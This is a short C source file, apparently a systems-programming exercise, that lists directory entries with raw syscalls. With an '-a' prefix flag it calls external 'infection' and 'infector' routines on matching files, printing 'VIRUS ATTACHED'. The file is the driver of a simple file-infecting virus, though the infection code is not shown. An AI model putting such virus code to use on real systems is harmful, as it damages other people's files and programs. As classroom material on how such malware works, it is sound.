#include "util.h"
#include <sys/syscall.h>

#define BUF_SIZE 8192
#define EXIT_ERROR 0x55
#define EXIT_SYSCALL 1
#define WRITE_SYSCALL 4
#define OPEN_SYSCALL 5
#define CLOSE_SYSCALL 6
#define GETDENTS_SYSCALL 141

extern int system_call();
extern void infection();
extern void infector(char*);

struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

int main(int argc, char *argv[]){
    int infect = 0;
    const char *prefix = 0;
    if (argc == 2 && argv[1][0] == '-' && argv[1][1] == 'a') {
        infect = 1;
        prefix = &argv[1][2];
    }
    int file = system_call(OPEN_SYSCALL, ".", 0);
    if (file < 0)
        system_call(EXIT_SYSCALL, EXIT_ERROR);
    char buf[BUF_SIZE];
    int files_length = system_call(GETDENTS_SYSCALL, file, (struct linux_dirent *)buf, BUF_SIZE);
    if (files_length < 0) {
        system_call(CLOSE_SYSCALL, file);
        system_call(EXIT_SYSCALL, EXIT_ERROR);
    }
    int pos = 0;
    while (pos < files_length) {
        struct linux_dirent *d = (struct linux_dirent *)(buf + pos);
        char *name = d->d_name;
        if (!infect) {
            system_call(WRITE_SYSCALL, 1, name,  strlen(name));
            system_call(WRITE_SYSCALL, 1, "\n", 1);
        }
        else {
            if (strncmp(name, prefix, strlen(prefix)) == 0) {
                system_call(WRITE_SYSCALL, 1, name, strlen(name));
                system_call(WRITE_SYSCALL, 1, " VIRUS ATTACHED\n", 17);
                infection();
                infector(name);
            }
        }
        pos += d->d_reclen;
    }
    system_call(CLOSE_SYSCALL, file);
    return 0;
}